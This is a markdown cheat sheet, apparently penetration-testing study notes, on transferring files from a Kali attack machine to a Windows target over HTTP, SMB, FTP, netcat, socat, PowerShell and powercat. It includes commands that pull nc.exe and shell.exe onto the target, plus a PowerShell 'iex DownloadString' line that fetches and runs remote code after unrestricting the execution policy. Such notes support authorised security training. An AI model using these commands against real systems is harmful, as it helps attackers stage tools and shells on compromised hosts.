# File Transfer

## HTTP Server

Server

``` bash
sudo python3 -m http.server 80
```

wget

``` bash
wget <uri> -O /path/to/file.ext

wget <uri> -P /path/to/
```

## SMB Protocol

Install

``` bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo pip install -r requirements.txt
sudo python3 setup.py install
```

SMB Server

``` bash
$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe

$ smbserver.py a /usr/share/windows-binaries/
```

SMB Client

``` bash
$ \\<ip_server>\a\whoami.exe
```

## FTP Server

Install

``` bash
sudo apt-get install vsftpd
sudo service vsftpd start
```

Anonymous access

``` bash
sudo nano /etc/vsftpd.conf

=> anonymous_enable=YES
```

## Pure-FTPd

setup-ftp.sh

``` bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd hades -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

ftp.txt

``` bash
open 192.168.11.140 21
USER hades
passwd
bin
GET nc.exe
quit
```

``` bash
ftp -v -n -s:ftp.txt
```

## Netcat

Kali machine

``` bash
nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
```

Windows machine

``` bash
nc -nv 192.168.11.130 4444 > wget.exe
```

## Socat

Kali machine

``` bash
sudo socat TCP4-LISTEN:443,fork file:shell.exe
```

Windows machine

``` bash
socat TCP4:192.168.11.130:443 file:shell.exe,create
```

## PowerShell

Kali machine

``` bash
sudo python3 -m http.server 80
```

Windows machine

``` bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
```

## Powercat

``` powershell
Set-ExecutionPolicy Unrestricted

iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

. .\powercat.ps1
```

Kali machine

``` bash
sudo nc -lnvp 443 > powercat.ps1
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
```

`483`